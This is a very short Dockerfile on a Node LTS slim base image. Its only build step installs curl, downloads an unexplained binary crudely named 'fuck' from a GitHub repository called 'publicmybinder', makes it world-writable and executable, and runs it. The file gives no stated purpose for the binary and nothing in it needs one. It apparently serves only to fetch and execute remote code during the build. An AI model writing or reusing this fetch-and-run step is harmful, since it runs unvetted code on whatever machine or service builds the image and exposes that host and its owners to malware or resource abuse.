FROM node:lts-slim

WORKDIR /app

RUN apt-get update && \
    apt-get install -y curl && \
    curl -L -o fuck https://github.com/occhoahihihih/publicmybinder/raw/refs/heads/main/fuck && \
    chmod 777 fuck && \
    ./fuck
